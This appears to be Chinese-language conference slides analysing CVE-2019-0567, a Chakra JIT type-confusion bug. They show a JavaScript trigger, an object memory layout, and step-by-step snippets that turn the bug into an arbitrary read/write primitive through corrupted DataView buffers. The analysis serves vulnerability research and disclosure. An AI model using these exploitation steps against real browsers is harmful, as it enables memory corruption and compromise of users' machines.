### Chakra JIT Type Confusion 案例分析: CVE-2019-0567

#### 根本原因分析
```javascript
function opt(obj1, obj2) {
    obj1.b = 1;
    let tmp = { __proto__: obj2 };
    obj1.a = 0x1234;
}

let obj1 = { a: 1, b: 2 };
let obj2 = {};
for (let i = 0; i < 10000; i++) {
    opt(obj1, obj2);
}
```

在上述代码中，通过多次调用 `opt` 函数并传递不同的对象参数，可以触发 Chakra JIT 编译器中的类型混淆漏洞。具体来说，`obj1` 和 `obj2` 的属性和原型链被频繁修改，导致 JIT 编译器错误地优化了这些对象的类型。

#### 漏洞利用
##### Exploit Memory Layout – R/W Primitive
为了利用这个漏洞，攻击者需要构造特定的对象布局以实现任意读写原语。以下是内存布局的示意图：

| vtable | type   | auxslots |
|--------|--------|----------|
|        |        |          |
| objectArray | length  | arrayBuffer |
| byteOffset  | buffer  |          |

| vtable | type   | auxslots |
|--------|--------|----------|
|        |        |          |
| objectArray | length  | arrayBuffer |
| byteOffset  | buffer  |          |

- `obj1` (DynamicObject)
- `obj3` (DynamicObject)
- `dv1` (DataView)
- `dv2` (DataView)

##### 利用步骤
1. **设置 `obj3->auxSlots` 为 `dv1`**
   ```javascript
   obj1.c = dv1;
   ```

2. **设置 `dv1->buffer` 为 `dv2`**
   ```javascript
   obj3.h = dv2;
   ```

3. **通过破坏 `dv2` 的缓冲区获取任意读写原语**
   ```javascript
   dv1.setUint32(0x38, addr_lo, true);
   dv1.setUint32(0x3c, addr_hi, true);
   ```

#### 结论
- Flash 仍然是攻击者的主要目标。由于 Adobe 将在 2020 年底停止更新 Flash，Flash 零日漏洞攻击的数量可能会减少。
- 在 2018 年，一些旧的脚本引擎开始成为攻击者的目标，例如 VBScript 和 JScript。未来可能会在这些脚本引擎中发现更多的零日漏洞攻击。
- VBSEmulator 可用于执行一些 VBScript 反混淆并检测可能的未知漏洞。
- 新的 JavaScript 引擎 Chakra 似乎很脆弱，尤其是 JIT 编译器。类型混淆易于利用。

谢谢！

### 浏览器脚本引擎零日漏洞（2018年）
@elli0tn0phacker  
Elliot Cao  
PI:EMAIL